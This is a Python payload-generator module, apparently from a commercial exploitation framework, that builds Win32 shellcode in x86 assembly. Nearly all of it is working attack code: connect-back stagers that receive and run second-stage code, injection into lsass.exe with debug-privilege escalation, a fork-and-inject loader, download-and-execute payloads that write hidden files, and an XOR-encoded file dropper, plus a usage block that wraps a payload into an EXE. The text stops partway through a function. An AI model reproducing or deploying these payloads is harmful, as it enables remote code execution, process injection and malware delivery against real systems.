#! /usr/bin/env python

# a cleaner payload generator for win32

from basecode import basecode
from basecode import s_to_push
from MOSDEF import mosdef
from exploitutils import *
import struct
import socket

USAGE = """
To create a simple file with the shellcode its quite simple:

import shellcode.clean.windows.payloads as payloads
p = payloads.payloads()
localhost = "172.16.193.1"
localport = 5555
sc = p.injectintoprocess( localhost, localport, target= "lsass.exe", 
load_winsock = True )
sc = p.assemble(sc)

print "Shellcode size: %x" % len(sc)
myPElib = pelib.PElib()
exe = myPElib.createPEFileBuf(sc, gui=True)
file = open('test.exe', 'wb+')
file.write(exe)
file.close()
"""

class payloads:
    def __init__(self, VirtualProtect = True):
        self.vprotect = VirtualProtect
        
    def get_basecode(self, **args):
        if self.vprotect:
            args["VirtualProtect"] = True
        return basecode( **args )

    def assemble(self, code):
        """ just a little convenience callthrough to mosdef.assemble """
        return mosdef.assemble(code, 'X86')
    
    def win32_exec(self, command):
        # a payload to just execute single commands
        codegen = self.get_basecode()

        codegen.find_function('kernel32.dll!createprocessa')
        codegen.find_function('kernel32.dll!exitthread')
        
        codegen._globals.addString('COMMAND', command)
        
        codegen.main += """
            xorl %ecx,%ecx
            xorl %eax,%eax
            movb $25,%cl        // want 100 bytes zeroed stack space
        pushnull:
            pushl %eax
            loop pushnull       // get some zeroed stackvar mem
            movl %esp,%ebx
            movl $68,(%ebx)     // si.cb
            movl $1,44(%ebx)    // si.dwFlags STARTF_USESHOWWINDOW
            leal 68(%ebx),%eax  // pi
            pushl %eax
            pushl %ebx
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            leal COMMAND-getpcloc(%ebp),%esi
            pushl %esi          // command
            pushl $0
            call *CREATEPROCESSA-getpcloc(%ebp)

            call *EXITTHREAD-getpcloc(%ebp)
        """
        return codegen.get()        


    def kostya_exec(self, command):
        # a payload to just execute single commands
        codegen = self.get_basecode()

        codegen.find_function('kernel32.dll!createprocessa')
        codegen.find_function('kernel32.dll!exitthread')
        
        codegen._globals.addString('COMMAND', command)
        
        codegen.main += """
            xorl %ecx,%ecx
            xorl %eax,%eax
            movb $25,%cl        // want 100 bytes zeroed stack space
        pushnull:
            pushl %eax
            loop pushnull       // get some zeroed stackvar mem
            movl %esp,%ebx
            movl $68,(%ebx)     // si.cb
            movl $1,44(%ebx)    // si.dwFlags STARTF_USESHOWWINDOW
            movl $1,48(%ebx)    // si.wShowWindow SW_SHOWNORMAL (is a word! but whatever lol)
            leal 68(%ebx),%eax  // pi
            pushl %eax
            pushl %ebx
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            pushl $0
            leal COMMAND-getpcloc(%ebp),%esi
            pushl %esi          // command
            pushl $0
            call *CREATEPROCESSA-getpcloc(%ebp)
        """
        return codegen.get()        

    # little demo to show the flexibility of the simplified generator
    def callback(self, host, port, load_winsock=True):
        """ generate a standalone callback payload .. example! """

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        if load_winsock == True:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')

        # enable the debug stub
        codegen.enable_debug()

        if load_winsock == True:
            # wsastartup
            codegen.main += """
                subl $0x200,%esp
                pushl %esp
                xorl %ebx,%ebx
                movb $0x1,%bh
                movb $0x1,%bl
                pushl %ebx
                call *WSASTARTUP-getpcloc(%ebp)
                addl $0x200,%esp // mosdef still has that issue with 0x100/256 sized addl's!
            """
        # now we write a little main using the functions
        # all needed inits etc. have already been added to main
        # functions found will be @ FUNCTIONLOC you call like so:
        # push args right to left
        # call *FUNCTIONLOC-getpcloc(%ebp)
        codegen._globals.addDword('FDSPOT')
        codegen.main += """

            pushl $0x6
            pushl $0x1
            pushl $0x2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,FDSPOT-getpcloc(%ebp)
            xorl %ebx,%ebx
            pushl %ebx
            pushl %ebx
            pushl $REPLACEHOST // host
            pushl $REPLACEPORT // port
            movl %esp,%ecx
            pushl $0x10
            pushl %ecx
            pushl %eax // holds sock
            call *CONNECT-getpcloc(%ebp)

            call debug
        """
        codegen.main = codegen.main.replace('REPLACEHOST', \
                           uint32fmt(istr2int(socket.inet_aton(host))))
        codegen.main = codegen.main.replace('REPLACEPORT', \
                           uint32fmt(reverseword((0x02000000 | port))))

        # now all that's left is to do a receive from fd spot :)
        # will fill that in later .. just testing if mechanism works ..
        return codegen.get()
    


    def injectintoprocess(self, host, port, pid=1234, target='lsass.exe', load_winsock = False, SeDebugPrivilege=False, waitcode = False):
        """ migrating callback payload .. size .. so minimal """
        codegen = self.get_basecode(restorehash = True)
                
        codegen.find_function('kernel32.dll!openprocess')
        codegen.find_function('kernel32.dll!virtualallocex')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!writeprocessmemory')
        codegen.find_function('kernel32.dll!createremotethread')
        codegen.find_function('kernel32.dll!exitthread')
        if waitcode:
            codegen.find_function("kernel32.dll!closehandle")
            codegen.find_function("kernel32.dll!waitforsingleobject")

        if load_winsock:
            codegen.find_function('kernel32.dll!loadlibrarya')
            codegen.load_library('ws2_32.dll')

        codegen.find_function('ntdll.dll!ntquerysysteminformation')
        if load_winsock == True:
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')
        
        if SeDebugPrivilege:        
            codegen.find_function("kernel32!getcurrentprocess")
            codegen.find_function("kernel32!closehandle")
            codegen.find_function("advapi32!lookupprivilegevaluea")
            codegen.find_function("advapi32!openprocesstoken")
            codegen.find_function("advapi32!adjusttokenprivileges")


        if load_winsock == True:
            # wsastartup
            codegen.main += """
                subl $0x200,%esp
                pushl %esp
                xorl %ebx,%ebx
                movb $0x1,%bh
                movb $0x1,%bl
                pushl %ebx
                call *WSASTARTUP-getpcloc(%ebp)
                addl $0x200,%esp
            """

        codegen._globals.addDword('RADDRESS')        
        codegen._globals.addUnicodeString('PROCESSNAME', target)
        if SeDebugPrivilege:
            codegen._globals.addDword('SE_DEBUG_NAME')        
        
        codegen.main += """
injectprocess:
            xorl %eax, %eax
            incl %eax
            jz callback_mode

            leal injectprocess-getpcloc(%ebp),%ecx
            movb $0x90, 2(%ecx)  
            """

        getTokenPrivs = """
        // get debug privileges SE_DEBUG_NAME == SeDebugPrivilege
        // SE_PRIVILEGE_ENABLED == 2
        // TOKEN_ADJUST_PRIVILEGES == 32
        // our TOKEN_PRIVILEGES STRUCT == { 1, { 0, 0, SE_PRIVILEGE_ENABLED }
        
        // build TOKEN_PRIVILEGES struct
        
        xor %edi, %edi
        xor %eax, %eax
        inc %eax
        pushl $2
        push  %edi
        pushl %edi
        pushl %eax
        movl %esp,%esi
        
        // lookupprivilegevaluea()
        
        pushl %esi
        addl $4,(%esp)
        leal SE_DEBUG_NAME-getpcloc(%ebp),%eax
        pushl %eax
        pushl %edi // 0x0
        call LOOKUPPRIVILEGEVALUEA-getpcloc(%ebp)
        
        // getcurrentprocess()
        
        call GETCURRENTPROCESS-getpcloc(%ebp)
        // openprocesstoken()
        
        pushl %edi
        // ptr to hToken
        pushl %esp
        pushl $32
        pushl %eax
        call OPENPROCESSTOKEN-getpcloc(%ebp)
        
        // get hToken
        movl (%esp),%esi
        
        // adjusttokenprivileges()
        
        pushl %edi //returnlength
        pushl %edi //bufferlength
        pushl $16 //pointer to NewState ??!!
        pushl %edi //disable all privs
        pushl %esi //token handle
        
        call *ADJUSTTOKENPRIVILEGES-getpcloc(%ebp)
        
        // closehandle()
        pushl %esi
        call CLOSEHANDLE-geteip(%ebp)
        """
        if SeDebugPrivilege:
            codegen.main += getTokenPrivs
               
        codegen.main += """
            pushl $0x40
            pushl $0x1000
            pushl $0xF004
            pushl $0
            call *VIRTUALALLOC-getpcloc(%ebp)
            movl %eax,%edi
            pushl %edi
            pushl $0xF000            
            addl $4,%edi
            pushl %edi
            pushl $5
            call *NTQUERYSYSTEMINFORMATION-getpcloc(%ebp)
            
            // #save information for backup
            // #pushl %edi
            
            // ptr = buffer + p->NextEntryDelta
next_delta:
            // don't ask ;P
            nop
            // check if no next delta, if none, jmp to backup
            movl (%edi),%eax
            
            addl (%edi),%edi
            // offset to ptr to UNICODE_STRING ProcessName is 0x38 + 4 
            movl 0x3c(%edi),%esi
            movl $PROCESSLEN,%ecx
            // cmp if len matches first, if not next delta
            //xorl %edx,%edx
            //movw 0x38(%edi),%dx
            //$cmpl %ecx,%edx
            //$jne next_delta
            // comparing strings
            leal PROCESSNAME-getpcloc(%ebp),%edx
            next_byte:
            movb (%esi),%al
            cmpb %al,(%edx)
            jne next_delta
            incl %esi
            incl %edx
            decl %ecx
            jnz next_byte
            // found LSASS.EXE !
            movl 0x44(%edi), %eax // saving pid            
openpid:
            // openprocess
            //xorl %eax,%eax
            //movw $PID,%ax
            pushl %eax
            xorl %eax,%eax
            pushl %eax
            movw $0x43a,%ax  // 0x43a
            pushl %eax
            call *OPENPROCESS-getpcloc(%ebp)
            movl %eax, %edi // Process handle

            // virtual alloc in remote process
            xorl %eax,%eax
            movb $0x40,%al
            pushl %eax
            movw $0x1000,%ax
            pushl %eax                   // AllocType
            // codesize
            pushl $0xdeadbabe            // dwSize
            xorl %eax,%eax
            pushl %eax                   // lpAddress
            pushl %edi                   // hProcess
            call *VIRTUALALLOCEX-getpcloc(%ebp)
            movl %eax, %esi // Remote Addr

            // write process memory our entire payload
            xorl %eax,%eax
            pushl %eax
            // codesize
            pushl $0xdeadbeef
            // code start is at ebp-11
            movl %ebp,%eax
            subl $11,%ax
            pushl %eax
            // dest is in RADDR
            pushl %esi
            pushl %edi
            call *WRITEPROCESSMEMORY-getpcloc(%ebp)

            // start the remote thread
            xorl  %eax, %eax
            pushl %eax
            pushl %eax
            pushl %eax
            pushl %esi
            pushl %eax
            pushl %eax
            pushl %edi
            call *CREATEREMOTETHREAD-getpcloc(%ebp)
            // WAITCODE

            // exit this thread .. handle leaks be damned
            pushl %eax
            call *EXITTHREAD-getpcloc(%ebp)

callback_mode:
            // this is where the code we want to inject goes
            //int3

            //call socket(2, 1, 6)
            pushl $6
            pushl $1
            pushl $2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,%esi //save this off
            leal 4(%esp),%edi
            movl $PORT,4(%esp)
            movl $IPADDRESS,8(%esp)
            push $0x10 
            pushl %edi
            pushl %eax
            call *CONNECT-getpcloc(%ebp)
            
            leal codeend-getpcloc(%ebp),%edi
            
            pushl $0
            push $4
            pushl %edi 
            pushl %esi
            call *RECV-getpcloc(%ebp)
            //int3
            movl (%edi),%eax
            //subl %eax,%esp
            //andl $-4,%esp
            //movl %esp,%edi
            
            pushl $0
            pushl %eax
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
stagetwo:
            jmp *%edi
            //int3
            //subl $0x1000,%esp
            //jmp *%edi

        """
        
        waitcode = """
        pushl %eax
        
        pushl $-1
        pushl %eax
        call WAITFORSINGLEOBJECT-getpcloc(%ebp)
        
        // closehandle() on thread handle and process handle, handle is already pushed
        
        // eax already pushed
        call CLOSEHANDLE-getpcloc(%ebp)
        pushl %edi
        call CLOSEHANDLE-getpcloc(%ebp)
        """
        print "[+] generating inject into pid: %d" % pid
        codegen.main = codegen.main.replace('PID', '0x%.4x' % pid)
        codegen.main = codegen.main.replace('PROCESSLEN', '0x%.8x' % (len(target)*2) )
        codegen.main = codegen.main.replace('IPADDRESS', \
                           uint32fmt(istr2int(socket.inet_aton(host))))
        codegen.main = codegen.main.replace('PORT', \
                           uint32fmt(reverseword((0x02000000 | port))))
        if waitcode:
            codegen.main.replace("WAITCODE", waitcode)
        
        asm = codegen.get()
        sc = mosdef.assemble(asm, 'X86')
        codesize = len(sc)
        codegen.main = codegen.main.replace('0xdeadbabe', '0x%.8x' % (len(sc) + 0x1000)) # Size to VirtualAllocEx
        codegen.main = codegen.main.replace('0xdeadbeef', '0x%.8x' % (len(sc) ))         # Size to WriteProcess
        f = open("1.txt", "w").write( codegen.main )
        # return final size filled payload
        return codegen.get()

    def forkload(self, host, port, processname = "dmremote", restorehash = True, load_winsock = False):
        """
          forkload forks a clipsrv.exe process and remotely create a thread and inject itself.

dmremote is used because it does not have a window, yet is a GUI process.
          
          After different approach to the same problem, the best option that came out was to createremotethread
          to a VirtualAllocEx memory that we inject ourselves, because if we modify the main server
          the dll were not initialized yet and so it crash on Critical Section usage and stuff like that.
          To avoid these, as I said before, we create a new thread and inject ourselve and do a kernel32.Sleep 
          of one second so we give the newly create process to initialize itself.
          If the option is given, it automatically loadlibrary ws2_32.dll
          
          Note: Another interesting trick which was need was "restorehash", which basically holds
          a copy of all the function hash and so when injected it restore them, since the default 
          behaviour of our resolver was to replace hashes with resolved address. We could have just
          leave it like that, but it wouldn't work on ASLR environment.

dave - Is ASLR per boot? I assume the other main reason this wouldn't work is
when things get rebased (which happens in lsass.exe a lot, for example).
          
          
        """
        codegen = self.get_basecode( restorehash = restorehash )
        # get the imports we need
        codegen.call_function('kernel32.dll!sleep', [1000] )
        if load_winsock:
            codegen.load_library('ws2_32.dll')
            codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!sleep')
        
        codegen.find_function("kernel32.dll!getthreadcontext")
        codegen.find_function("kernel32.dll!resumethread")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!virtualallocex")
        codegen.find_function("kernel32.dll!writeprocessmemory")
        codegen.find_function('kernel32.dll!createremotethread')
        codegen.find_function("kernel32.dll!exitthread")
        if load_winsock == True:
            codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!socket')
        codegen.find_function('ws2_32.dll!connect')
        codegen.find_function('ws2_32.dll!recv')
        
        
        
        codegen.main += ""
            
        """
        LSD style semi-fork() for win32
        
        NOTES:
          o this is mildy self modifying to get a bit of a UNIX style fork() feel
            basically we clear a marker that tells the opcode wether it's a parent
            or child thread on runtime. So when the payload is copied over we can
            decide if it's a "parent" or "child", where children jump to execute
            "forkthis:"
        
        """
        codegen.main += """
forkentry:
        // if this marker is cleared this jmps to forkthis:
        // we copy this entire payload over ;)
        xorl %eax, %eax
        incl %eax
        test %eax,%eax
        jz forkthis
        
        // start of self modifying muck
        
        // Self modifying code, change the incl for a nop 
        leal forkentry-getpcloc(%ebp),%ecx
        movb $0x90, 2(%ecx)  
        
        leal startsploit-getpcloc(%ebp),%ecx
        
        // patch out mov ebx,esp, either way we want to keep esp as is on the "child"
        
        // end of self modifying muck
        
        // STARTUPINFO
        subl $68,%esp
        movl %esp,%ecx
        // PROCESS_INFORMATION
        subl $16,%esp
        movl %esp,%edx
        // CONTEXT
        subl $716,%esp
        movl %esp,%edi
        
        // save vars for later use
        pushl %edi   // CONTEXT
        //pushl %ecx   // STARTUPINFO
        //pushl %edx   // PROCESS INFORMATION
        
        
        pushl %ecx           
        // zero out vars before use
        // 800 bytes total
        decl %eax // eax was 1
        movl $800, %ecx
        rep stosb
        
        // restore %ecx
        popl  %ecx
        
        PROCESSINJECT
        
        movl %esp,%esi
        
        // &PROCESS_INFORMATION
        pushl %edx
        // &STARTUPINFO = {0}
        // movl %eax,(%ecx) // we dont need this one, we already zero it out
        pushl %ecx
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // CREATE_SUSPEND
        pushl $0x4
        // 0
        pushl %eax
        // NULL
        pushl %eax
        // NULL
        pushl %eax
        // "cmd"
        pushl %esi
        movl %edx, %esi // process information saved on esi
        // NULL
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        
        // CLEANING THE STRING PUSHING
        PROCESSCLEAN
        
        
        pushl 4(%esi)      // push pi.Thread
        movl (%esi), %esi  // esi now holds the Handle
        leal shellcodestart-getpcloc(%ebp),%edx
        leal endmark-getpcloc(%ebp),%ecx
        subl %edx,%ecx

        pushl %edx // shellcodestart
        pushl %ecx // size
        
        // virtual alloc in remote process
        xorl %eax,%eax
        movb $0x40,%al
        pushl %eax
        movw $0x1000,%ax
        pushl %eax                   // AllocType
        // codesize
        pushl %edx                  // dwSize
        xorl %eax,%eax
        pushl %eax                   // lpAddress
        pushl %esi                   // hProcess
        call *VIRTUALALLOCEX-getpcloc(%ebp)
        movl %eax, %edi

        pop %ecx // size
        pop %edx // shellcodestart
        
        
        // write process memory our entire payload
        xorl %eax,%eax
        pushl %eax
        // codesize
        pushl %ecx
        // code start is at ebp-11
        //movl %ebp,%eax
        //subl $11,%ax
        pushl %edx   // shellcode start
        pushl %edi   // valloc addr
        pushl %esi   // hProcess
        call *WRITEPROCESSMEMORY-getpcloc(%ebp)
        
        popl  %ebx // get pi.Thread
        popl  %eax // get context info        
        //movl  %eax,%edi // edi is now context info
        pushl %esi        // save hProcess
        movl  %ebx, %esi // esi is pi.Thread
        
        // ctx.ContextFlag=Context_FULL
        movl $0x10007, (%eax)
        // &ctx
        pushl %eax
        // pi.hThread
        pushl %esi
        call GETTHREADCONTEXT-getpcloc(%ebp)
             
        popl %ebx // restore hProcess
        
        // start the remote thread
        xorl  %eax, %eax
        pushl %eax
        pushl %eax   // CREATE and Run the thread
        pushl %eax
        pushl %edi   // Shellcode address
        pushl %eax
        pushl %eax
        pushl %ebx   // hProcess
        call *CREATEREMOTETHREAD-getpcloc(%ebp)

        // pi.hThread
        pushl %esi
        call RESUMETHREAD-getpcloc(%ebp)
        
postfork:
        
        // reset stack and ret?
        // we should really save state before findeip muck
        // and restore (popa?) at this point to ret or whatever
        // dave - hmm. Shouldn't we instead jmp exit? or even a jmp forkparent:
        addl $804,%esp
        
        xorl %eax,%eax
        pushl %eax
        call EXITTHREAD-getpcloc(%ebp)
        
forkthis:
           subl $0x200,%esp
           pushl %esp
           xorl %ebx,%ebx
           movb $0x1,%bh
           movb $0x1,%bl
           pushl %ebx
           call *WSASTARTUP-getpcloc(%ebp)
           addl $0x200,%esp // mosdef still has that issue with 0x100/256 sized addl's!

            // to fork code is tacked on here
            // to fork code is tacked on here
            pushl $6
            pushl $1
            pushl $2
            cld
            call *SOCKET-getpcloc(%ebp)
            movl %eax,%esi //save this off
            leal 4(%esp),%edi
            movl $PORT,4(%esp)
            movl $IPADDRESS,8(%esp)
            push $0x10 
            pushl %edi
            pushl %eax
            call *CONNECT-getpcloc(%ebp)
            
            leal codeend-getpcloc(%ebp),%edi
gogetlen:
            pushl $0
            push $4
            pushl %edi 
            pushl %esi
            call *RECV-getpcloc(%ebp)
            //int3
            movl (%edi),%eax
            //subl %eax,%esp
            //andl $-4,%esp
            //movl %esp,%edi

            pushl $0
            pushl %eax
            pushl %edi
            pushl %esi
            call *RECV-getpcloc(%ebp)
stagetwo:
            jmp *%edi
endmark:
        """
        
        
        codegen.main = codegen.main.replace('IPADDRESS', \
                                            uint32fmt(istr2int(socket.inet_aton(host))))
        codegen.main = codegen.main.replace('PORT', \
                                            uint32fmt(reverseword((0x02000000 | port))))

        outcode = ""
        idx = 0
        if (len( processname ) % 4) == 0:
            outcode += "push %eax\n"
            idx += 1
        ret = s_to_push(processname, "<")
        idx += len(ret)
        outcode += "".join( [ "push $0x%08x\n"% x  for x in ret ] )
        codegen.main = codegen.main.replace("PROCESSINJECT", outcode)
        codegen.main = codegen.main.replace("PROCESSCLEAN", "popl %eax\n" * idx)
        

        #if args == None:
        #codegen.main = codegen.main.replace("ESPPATCH", patch)
        # else we patch

        
        return codegen.get()

    def httpcachedownload(self, urlfile, isBatch = False):
        """
        Http Cache Download 
          This shellcode will automatically download a file into the IE cache and execute it.
          Depending on what you program you are executing, you might need to append "cmd /c" at the begging,
          to do that just enable isBatch
          Note: Right now this doesn't work with CANVAS httpuploader due to incompatibilities issue.
dave - like what? Let's fix those. 
        """
        
        codegen = self.get_basecode()
        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!exitthread")
        codegen.load_library('urlmon.dll')                                    
        codegen.find_function("urlmon.dll!urldownloadtocachefilea")
        codegen._globals.addString("URLNAME", urlfile)
        
        codegen.main = """
        xorl %eax, %eax
        mov $0x208, %edx
        //movl %ecx, %edx
        sub %edx, %esp
        movl  %esp, %esi
        
        leal URLNAME-getpcloc(%ebp),%edi     // ESI holds the url name
        
        pushl %esi
        // BATCHCODE
        // ------
  
        pushl %eax                           // pBSC
        pushl %eax                           // dwReserved
        pushl %edx                           // dwBufLength
        pushl %esi                           // szFileName
        pushl %edi                           // URL       
        pushl %eax                           // lpUnkCaller
        call URLDOWNLOADTOCACHEFILEA-getpcloc(%ebp) // HFILE handle
        
        pop %esi  // get the file back
        
        xorl %eax, %eax
        movl  $0x100, %ecx
        subl  %ecx, %esp
        movl %esp, %edi // CLEAR the buffer
        rep stosb
        
        leal 16(%esp), %ecx
        leal 84(%esp), %edx
        mov $0x1, 0x2c(%edx)
        
        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax     
        pushl %eax     
        pushl %eax    // Creation Flag    
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %esi  // command
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        xorl %eax,%eax
        pushl %eax
        call EXITTHREAD-getpcloc(%ebp)        
        """

        batchcode= """
        movl  $0x20646D63, (%esi)  
        movl  $0x22204b2F, 4(%esi) // "cmd /c"
        sub   $-8, %edx
        add   $8, %esi  // esi pointing after the "cmd /c"
        """        
        if isBatch:
            codegen.main = codegen.main.replace("BATCHCODE", batchcode)
                    
        return codegen.get()
    
    def httpdownload(self, urlfile, filename = ""):
        codegen = self.get_basecode()
        
        codegen.find_function("kernel32.dll!loadlibrarya")
        codegen.find_function("kernel32.dll!createfilea")
        codegen.find_function("kernel32.dll!writefile")
        codegen.find_function("kernel32.dll!closehandle")
        codegen.find_function("kernel32.dll!createprocessa") 
        codegen.find_function("kernel32.dll!exitprocess")
        codegen.load_library('wininet.dll')
        codegen.find_function("wininet.dll!internetopena")
        codegen.find_function("wininet.dll!internetopenurla")
        codegen.find_function("wininet.dll!internetreadfile")
        
        codegen._globals.addString("URLNAME", urlfile)
        
        codegen.main = """
httpdownload:
        xorl %esi, %esi
        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi
        call INTERNETOPENA-getpcloc(%ebp) // creating a HINTERNET object
        movl %eax, %edi
        
        pushl %esi
        pushl %esi
        pushl %esi
        pushl %esi        
        leal URLNAME-getpcloc(%ebp),%esi     // ESI holds the url name
        pushl %esi
        pushl %edi                           // HINTERNET
        call INTERNETOPENURLA-getpcloc(%ebp) // HFILE handle
        pushl %edi       // saving HINTERNET
        //pushl %eax       // saving HFILE
        movl %eax, %edi  // HFILE is now on edi
        
        xorl %eax, %eax
        pushl %eax
        // FILE_ATTRIBUTE_NORMAL 0x80
        // FILE_ATTRIBUTE_HIDDEN  0x2
        movb $0x82, %al
        push %eax
        movb $0x2, %al
        push %eax
        xor %eax, %eax
        push %eax      // lpSecurityAttributes NULL
        push %eax      // dwShareMode 0x0
        inc  %eax
        ror  $4, %eax
        push %eax      // GENERIC_ALL 0x10000000
        leal OFFSETTOFILE(%esi), %eax        // URLNAME + OFFSET to get the file (http://www/file.exe
        push %eax
        call CREATEFILEA-getpcloc(%ebp)
        //pushl %eax // save Filed
        //movl %eax, %edi     // file descriptor
        
        mov  $0x208, %ebx
        subl %ebx, %esp
        movl %esp, %esi
        pushl %eax  // SAVE hfile

downloadloop:
        leal  4(%esi), %ebx
        pushl %ebx       // written bytes
        pushl $0x200   // bytes to read
        leal  8(%esi), %ebx
        pushl %ebx     
        pushl %edi     // hFile
        call INTERNETREADFILE-getpcloc(%ebp)
        
        movl  4(%esi), %ebx
        test  %ebx, %ebx
        jz finishdownload // Check if internetread read 0 bytes
        
        popl  %ebx  // get the filedescriptor
        pushl %ebx  // save it back
        
        xorl %eax, %eax
        pushl  %eax  //    NULL
        leal  4(%esi), %ecx
        pushl %ecx       // written bytes
        pushl $0x200     // bytes to write
        leal 8(%esi), %ecx
        pushl %ecx           // buffer
        pushl %ebx       // filefd
        call WRITEFILE-getpcloc(%ebp)
        jmp downloadloop
finishdownload:
        // since filefd is already pushed, i can directly call close handle
        call CLOSEHANDLE-getpcloc(%ebp)
        //mov  %ebx, 0x208
        //addl %ebx, %esp
        xorl %ecx, %ecx
        xorl %eax, %eax
        movl  $0x208, %ecx
        movl %esp, %edi // CLEAR the buffer
        rep stosb
        
        leal 16(%esp), %ecx
        leal 84(%esp), %edx
        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax     
        pushl %eax     
        pushl %eax    // Creation Flag    
        pushl %eax
        pushl %eax
        pushl %eax
        leal URLNAME-getpcloc(%ebp),%ecx     
        leal OFFSETTOFILE(%ecx), %ecx        // URLNAME + OFFSET to get the file (http://www/file.exe
        pushl %ecx  // command
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        call EXITPROCESS-getpcloc(%ebp)
        """
        
        codegen.main = codegen.main.replace('OFFSETTOFILE', \
                                            uint32fmt( urlfile.rfind("/") + 1 ))
        
        return codegen.get()

    def attachandexecute(self, filename = "", remotefilename="t.exe", args = None, xorencode = False, ):
        codegen = self.get_basecode()
        import urllib
        
        codegen.find_function("kernel32.dll!createfilea")
        codegen.find_function("kernel32.dll!writefile")
        codegen.find_function("kernel32.dll!closehandle")
        codegen.find_function("kernel32.dll!createprocessa") 
        codegen.find_function("kernel32.dll!exitprocess")
        if args:
            codegen._globals.addString("FILEARGS", "%s %s" % (remotefilename, args))
            
        codegen._globals.addString("FILENAME", remotefilename)
        
        codegen.main = """
attachandexecute:
        leal FILENAME-getpcloc(%ebp),%esi     // ESI holds the url name
        
        xorl %eax, %eax
        pushl %eax
        // FILE_ATTRIBUTE_NORMAL 0x80
        // FILE_ATTRIBUTE_HIDDEN  0x2
        movb $0x82, %al
        push %eax
        movb $0x2, %al
        push %eax
        xor %eax, %eax
        push %eax      // lpSecurityAttributes NULL
        push %eax      // dwShareMode 0x0
        inc  %eax
        ror  $4, %eax
        push %eax      // GENERIC_ALL 0x10000000
        push %esi
        call CREATEFILEA-getpcloc(%ebp)
        pushl %eax
        //movl %eax, %edi     // file descriptor
        
        leal filestart-getpcloc(%ebp), %edx
        // XORCODE
        
        xorl %ebx, %ebx
        pushl  %ebx  //    NULL
        leal  8(%esp), %ecx
        pushl %ecx       // written bytes
        pushl $FILELEN     // bytes to write
        //leal filestart-getpcloc(%ebp),%ecx     
        pushl %edx           // buffer
        pushl %eax           // filefd
        call WRITEFILE-getpcloc(%ebp)

finishdownload:
        // since filefd is already pushed, i can directly call close handle
        call CLOSEHANDLE-getpcloc(%ebp)
        //mov  %ebx, 0x208
        //addl %ebx, %esp
        xorl %ecx, %ecx
        xorl %eax, %eax
        movl  $0x208, %ecx
        subl  %ecx, %esp
        movl %esp, %edi // CLEAR the buffer
        rep stosb
        
        leal 16(%esp), %ecx
        leal 84(%esp), %edx
        
        // ARGUMENTS
        
        pushl %ecx   // PROCESS INFORMATION
        pushl %edx   // STARTUP INFO
        pushl %eax     
        pushl %eax     
        pushl %eax    // Creation Flag    
        pushl %eax
        pushl %eax
        pushl %eax
        pushl %esi  // command
        pushl %eax
        call CREATEPROCESSA-getpcloc(%ebp)
        call EXITPROCESS-getpcloc(%ebp)
filestart:
        .urlencoded "FILEBUFFER"
        """
        f= open( filename, "rb")
        buf = f.read()
        f.close()
        
        if xorencode:
            import random
            key = random.randint(1, 255)
            xorcode = """
            movl  $FILELEN, %%ecx       
            movl  %%edx, %%ebx        // save value
        xorfile:
            xorb $%d, (%%ebx)
            incl %%ebx
            loop xorfile
            """ % key
            codegen.main = codegen.main.replace('XORCODE', xorcode)
            buf = "".join( [ chr(ord(x) ^ key) for x in buf] )
            
        codegen.main = codegen.main.replace('FILELEN', \
                                            uint32fmt( len(buf) ))
        codegen.main = codegen.main.replace('FILEBUFFER', \
                                            urllib.quote(buf))
        if args:
            code = """
            leal FILEARGS-getpcloc(%ebp),%esi
            """
            codegen.main = codegen.main.replace('ARGUMENTS', code )
            

        return codegen.get()
    
    
    def __forkload(self, restorehash = False):
        
        codegen = self.get_basecode(restorehash = restorehash)
        # get the imports we need
        codegen.find_function('kernel32.dll!sleep')
        codegen.call_function('kernel32.dll!sleep', [5000] )
        codegen.find_function('kernel32.dll!loadlibrarya')
        
        codegen.load_library('ws2_32.dll')
        #codegen.find_function('ws2_32.dll!wsastartup')
            
        codegen.find_function("kernel32.dll!getthreadcontext")
        codegen.find_function("kernel32.dll!resumethread")
        codegen.find_function("kernel32.dll!createprocessa")
        codegen.find_function("kernel32.dll!virtualallocex")
        codegen.find_function("kernel32.dll!writeprocessmemory")
        codegen.find_function("kernel32.dll!setthreadcontext")
        codegen.find_function("kernel32.dll!exitthread")

        codegen.main += ""
            
        """
        LSD style semi-fork() for win32
        
        NOTES:
          o this is mildy self modifying to get a bit of a UNIX style fork() feel
            basically we clear a marker that tells the opcode wether it's a parent
            or child thread on runtime. So when the payload is copied over we can
            decide if it's a "parent" or "child", where children jump to execute
            "forkthis:"
        
        """
        codegen.main += """
forkentry:
        // if this marker is cleared this jmps to forkthis:
        // we copy this entire payload over ;)
        xorl %eax, %eax
        incl %eax
        test %eax,%eax
        jz forkthis
        
        // start of self modifying muck
        
        // Self modifying code, change the incl for a nop 
        leal forkentry-getpcloc(%ebp),%ecx
        movb $0x90, 2(%ecx)  
        
        leal startsploit-getpcloc(%ebp),%ecx
        
        // patch out mov ebx,esp, either way we want to keep esp as is on the "child"
        
        // end of self modifying muck
        
        // STARTUPINFO
